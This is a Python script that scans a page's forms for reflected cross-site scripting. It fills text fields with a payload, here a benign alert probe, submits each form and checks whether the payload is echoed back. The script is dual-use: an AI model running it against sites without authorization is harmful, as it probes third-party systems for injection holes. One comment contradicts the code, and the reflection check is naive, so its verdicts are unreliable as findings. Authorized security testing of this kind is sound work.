import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

# This script is designed to perform XSS injection attacks for testing purposes.
# It should only be used in legal contexts, with proper authorization.

def xss_injection_test(url, payload, session=None):
    """
    Test an input form for XSS vulnerability using a given payload.

    :param url: The URL of the page with the form to test.
    :param payload: The XSS payload to inject.
    :param session: An optional requests session object for persistent cookies.
    :return: A boolean indicating if the payload was successful.
    """
    if session is None:
        session = requests.Session()

    # Get the page content
    response = session.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')

    # Find all forms in the HTML
    forms = soup.find_all('form')

    # Assume the form is vulnerable until proven otherwise
    is_vulnerable = False

    # Test each form
    for form in forms:
        form_action = form.get('action')
        post_url = urljoin(url, form_action)
        method = form.get('method', 'get').lower()

        # Prepare the form data
        data = {}
        for input_tag in form.find_all('input'):
            input_name = input_tag.get('name')
            input_type = input_tag.get('type', 'text')
            input_value = input_tag.get('value', '')
            if input_type == 'text':
                data[input_name] = payload
            else:
                data[input_name] = input_value

        # Send the form data
        if method == 'post':
            response = session.post(post_url, data=data)
        else:
            response = session.get(post_url, params=data)

        # Check if the payload is reflected in the response
        if payload in response.text:
            is_vulnerable = True
            break

    return is_vulnerable

# Example usage:
if __name__ == '__main__':
    target_url = 'http://example.com/form_page'
    xss_payload = '<script>alert("XSS")</script>'
    if xss_injection_test(target_url, xss_payload):
        print(f"The page at {target_url} is vulnerable to XSS.")
    else:
        print(f"The page at {target_url} is not vulnerable to XSS.")